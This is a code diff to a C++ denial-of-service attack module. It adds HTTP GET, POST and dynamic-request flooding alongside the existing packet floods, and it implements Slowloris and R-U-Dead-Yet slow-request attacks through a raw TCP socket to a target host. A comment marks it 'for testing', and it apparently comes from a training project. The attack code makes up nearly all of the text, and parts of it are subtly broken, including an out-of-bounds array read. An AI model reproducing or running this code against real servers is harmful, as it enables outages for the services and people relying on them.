@@ -1,5 +1,10 @@
 #include "../lib/atkmod.h"
 
+// HTTP Attack (for testing)
+#define PORT 1234
+#define ATTACK_SLEEP 3
+
+
 ATTACKMODULE::ATTACKMODULE(char* dev, std::string tip, int type, int speed, int dur){
     this->dev = dev;
     this->atktype = type;
@@ -24,6 +29,15 @@ void ATTACKMODULE::get_targetinfo(std::string tip){
 void ATTACKMODULE::attack(){
     std::thread AttackThreads[THREADS];
     
+    if (atktype >= 9){
+        more_setting();
+        
+        if (atktype == 12 || atktype == 14){
+            http_attack();
+            return;
+        }
+    };
+
     for(int i = 0; i < THREADS; i++){
         AttackThreads[i] = std::thread(&ATTACKMODULE::attack_routine, this);
     }
@@ -102,37 +116,34 @@ void ATTACKMODULE::attack_routine(){
             
             // GET_FLOODING_ATTACK
             case 9:
-
-                // send ACK packet
-                packet.handshake(target_mac, target_ip);
-
-                packet.make_packet(target_mac, target_ip, TCP, SYN_ACK, 0);
+                // last arg is for sd
+                packet.make_packet(target_mac, target_ip, HTTP, GET, sd);
                 break;
 
             // POST_FLOODING_ATTACK
             case 10:
-
+                // last arg is for sd
+                packet.make_packet(target_mac, target_ip, HTTP, POST, sd);
                 break;
 
             // DYNAMIC_HTTP_REQ_FLOODING
             case 11:
-
+                packet.make_packet(target_mac, target_ip, HTTP, DYNAMIC_HTTP_REQ, sd);
                 break;
 
-            // SLOWLORIS_ATTACK
-            case 12:
+            ////// SLOWLORIS_ATTACK
+            // case 12:
+            //     packet.make_packet(target_mac, target_ip, HTTP, SLOWLORIS, sd);
+            //     break;
 
-                break;
-
-            // SLOWREAD_ATTACK
+            ////// SLOWREAD_ATTACK
             case 13:
-
                 break;
 
             // R-U-D-Y_ATTACK
-            case 14:
-
-                break;
+            // case 14:
+            //     packet.make_packet(target_mac, target_ip, HTTP, RUDY, sd);
+            //     break;
 
             // BIG1_ATTACK
             case 15:
@@ -143,7 +154,10 @@ void ATTACKMODULE::attack_routine(){
                 printf("type error");
                 break;
         }
-        int size = packet.send_packet();
+        int size = 0;
+
+        if(atktype <= 8) packet.send_packet();
+        size = packet.get_pktsize();
         count++;
         
         std::chrono::system_clock::time_point EndTime = std::chrono::system_clock::now();
@@ -158,4 +172,77 @@ void ATTACKMODULE::attack_routine(){
         avg_sleep = (avg_sleep * (count - 1) + req.tv_nsec) / count;
         nanosleep(&req, NULL);
     }
+}
+
+
+// sock connet for HTTP attack
+void ATTACKMODULE::more_setting(){
+
+	sd = socket(AF_INET, SOCK_STREAM, 0);
+	if (sd == -1) {
+		perror("socket");
+		return;
+	}
+
+    struct sockaddr_in addr;
+	addr.sin_family = AF_INET;
+
+	addr.sin_port = htons(PORT);
+	addr.sin_addr.s_addr = target_ip;
+	memset(&addr.sin_zero, 0, sizeof(addr.sin_zero));
+
+    int res = connect(sd, (struct sockaddr *)&addr, sizeof(addr));
+	if (res == -1) {
+		perror("connect");
+		return;
+	}
+
+}
+
+void ATTACKMODULE::http_attack(){
+    using namespace std;
+
+    struct in_addr target;
+    target.s_addr = target_ip;
+    string host {inet_ntoa(target)};
+    string cont_len;
+    string data_str = "";
+    string http_type_temp;
+    string http_temp = " / HTTP/1.1\r\n";
+    string host_temp = "Host: " + host + "\r\n";
+    string user_agent_temp = getRandUserAgent() + "\r\n";
+    string tmpStr;
+    char data[17] = "hello bob 9th!!";
+
+    for (int i = 0 ; i < dur/ATTACK_SLEEP ; i++){
+        switch (atktype)    {
+        
+        // Slowloris - 마지막 개행문자(\r\n)를 생략
+        case 12:
+            http_type_temp = "POST";
+            cont_len = "17";
+            data_str = data;
+            break;
+        
+        // RU-Dead-Yet? RUDY ATTACK - Content-length를 높게 설정, 소량의 데이터 전송
+        case 14:
+            http_type_temp = "POST";
+            cont_len = "1000000";
+            data_str = data[i % 25];
+            break;
+
+        default:
+            break;
+        }
+        string content_len_temp = "Content-length: " + cont_len + "\r\n";
+        string tmpStr = http_type_temp + http_temp + host_temp + user_agent_temp + content_len_temp + data_str + "\r\n";
+        if (atktype != 12){
+            tmpStr += "\r\n";
+        }
+
+        ssize_t res = send(sd, tmpStr.c_str(), tmpStr.size(), 0);
+        sleep(ATTACK_SLEEP);
+
+    }
+    
 }
